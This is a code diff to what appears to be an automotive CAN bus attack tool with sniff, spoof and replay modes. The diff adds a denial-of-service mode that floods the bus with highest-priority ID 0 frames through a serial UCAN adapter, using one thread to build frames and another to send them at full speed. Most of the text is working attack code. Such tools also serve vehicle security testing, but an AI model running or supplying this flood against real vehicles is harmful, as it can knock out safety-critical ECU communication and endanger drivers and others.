@@ -5,7 +5,7 @@ Usage:
     app.py sniff [--port=COM6] [--baudrate=115200] [-d] [--conf=path] [--out] [(--BL case <case_name> )]
     app.py spoof [( <target_ecu_name> <msg_id> <signal_name> <new_val> <msg_rate> )][--port=COM6] [--baudrate=115200] [-d] [--conf=path]
     app.py replay <target_id> [ --new <new_val>] [--port=COM6] [--baudrate=115200] [-d]
-    app.py dos [--port=COM6] [--baudrate=115200]
+    app.py dos [--port=COM6] [--baudrate=115200] [-d] [(--BL case <case_name> )]
     app.py report (-v case <case_name> )|
 Options:
     --port=COM6         Select the port we connected our UCAN on default is COM6
@@ -26,6 +26,8 @@ try:
     from decimal import *
     import matplotlib.pyplot as plt
     import csv
+    from multiprocessing import Pool
+
 except:
     print 'Import Errors!!'
 
@@ -55,6 +57,7 @@ MSG_TEMP=0 #used in bus load function
 RATE=0 #used in bus load function
 CASENAME =""
 NO_AUTH=False
+MSGS_QUEUE = []
 mutex = Lock()
 
 
@@ -394,6 +397,34 @@ def hex_to_binary(h):
 #     plt.show()
 
 
+class packageMsgForDOS(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+
+    def run(self):
+        while True:
+            msg = CAN_MSG
+            #start sending msgs of id =0 over the bus with max rate
+            msg.frame_id=0
+            msg.frame_dlc=8
+            msg.data='ffffffffffffffff'
+            global MSGS_QUEUE
+            b=UCAN.UCAN_encode_message(msg)
+            MSGS_QUEUE.append(b)
+
+class dos(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+
+    def run(self):
+        while True:
+            global MSGS_QUEUE,MSG_COUNTER
+            if len(MSGS_QUEUE) != 0:
+                b = MSGS_QUEUE.pop()
+                MSG_COUNTER+=1
+                ser.write(b)
+
+
 if __name__ == '__main__':
     threads=[]
     # NO_AUTH=False
@@ -520,13 +551,41 @@ if __name__ == '__main__':
             threads.append(thread)
         except:
             print('can not start sniff thread ')
-    
-    #in case of replay attack #todo we can inhance the app with a time to start and the no of repeat
-    if arguments['replay'] == True:
-        print COM_PORT
+    #in case of DOS
+    if arguments['dos'] == True:
         if arguments['--port'] != None : #set the com port
             COM_PORT = arguments['--port']
-            print COM_PORT
+            print 'DEBUG->> PORT is =',COM_PORT
+
+        if arguments['-d'] == True: #enable Debug mode
+            DEBUG=True
+
+        if arguments['--baudrate'] != None: #set baudrate
+            BaudRate = int(arguments['--baudrate'])
+
+        if arguments['--BL'] == True:
+            if arguments['case'] == True:
+                if DEBUG==True :
+                    print "DEBUG --> case name is " , arguments['<case_name>']
+                CASENAME = arguments['<case_name>']
+            thread = calc_BusLoad()
+            thread.start()
+            threads.append(thread)
+        #start dos
+        thread = packageMsgForDOS()
+        thread.start()
+        threads.append(thread)
+        thread = dos()
+        thread.start()
+        threads.append(thread)
+
+
+
+    #in case of replay attack #todo we can inhance the app with a time to start and the no of repeat
+    if arguments['replay'] == True:
+        if arguments['--port'] != None : #set the com port
+            COM_PORT = arguments['--port']
+            print 'DEBUG->> PORT is =',COM_PORT
 
         if arguments['-d'] == True: #enable Debug mode
             DEBUG=True
